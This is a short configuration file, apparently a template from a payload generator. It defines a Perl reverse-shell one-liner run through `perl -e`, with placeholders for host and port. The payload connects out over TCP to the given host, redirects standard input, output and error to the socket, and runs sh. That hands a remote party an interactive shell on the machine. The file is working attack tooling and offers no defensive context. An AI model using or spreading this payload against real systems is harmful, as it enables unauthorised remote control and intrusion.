USAGE = 'host port'
NARGS = [2, 2]
LANG = 'pl'
EXEC = '''
perl -e "PAYLOAD"
'''


# FIXME PF_INET=2
# FIXME SOCK_STREAM=1
pl = '''
use Socket;socket(VAR0,PF_INET,SOCK_STREAM,6);if(connect(VAR0,sockaddr_in(ARG2,inet_aton('ARG1')))){open(STDIN,'>&VAR0');open(STDOUT,'>&VAR0');open(STDERR,'>&VAR0');exec('sh');};
'''
